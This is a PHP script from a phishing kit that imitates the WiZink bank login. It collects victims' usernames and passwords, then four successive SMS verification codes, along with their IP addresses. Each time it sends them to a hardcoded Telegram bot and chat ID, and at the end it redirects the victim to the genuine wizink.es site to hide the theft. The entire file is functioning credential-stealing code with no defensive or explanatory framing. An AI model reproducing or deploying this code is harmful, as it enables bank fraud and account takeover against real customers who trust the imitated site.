<?php 

// =======> made in : telegram : @ghayt_Zone >=======

require_once "functions.php";




$to = '';
$apiToken = "6243210105:AAFgOonZstD7WzAvsfDsUEj8JbLkgUAwl58";
$id = "1024931191";




if ($_POST['step']== 'index') {
    $user = $_POST['user'];
    $password = $_POST['password'];

    if (empty($user) || empty($password)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | LOGIN | WIZINK "       . "\r\n" ;
        $message .= "USERNAME : " . $user                   . "\r\n";
        $message .= "PASSWORD : " . $password             . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading.php");
        exit();
    }
}


if ($_POST['step']== 'sms2') {
    $sms = $_POST['sms'];

    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | WIZINK "       . "\r\n" ;
        $message .= "SMS 1: " . $sms                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading3.php");
        exit();
    }
}

if ($_POST['step']== 'sms-er') {
    $sms = $_POST['sms'];

    if (empty($sms)) {

        header("Location: sms-er.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | WIZINK "       . "\r\n" ;
        $message .= "SMS 2: " . $sms                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location:sms-err.php");
        exit();
    }
}


if ($_POST['step']== 'sms-err') {
    $sms = $_POST['sms'];

    if (empty($sms)) {

        header("Location: sms-err.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | WIZINK "       . "\r\n" ;
        $message .= "SMS 3: " . $sms                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location:sms-errr.php");
        exit();
    }
}

if ($_POST['step']== 'sms-errr') {
    $sms = $_POST['sms'];

    if (empty($sms)) {

        header("Location: sms-er.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | WIZINK "       . "\r\n" ;
        $message .= "SMS 4: " . $sms                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location:https://www.wizink.es/");
        exit();
    }
}



?>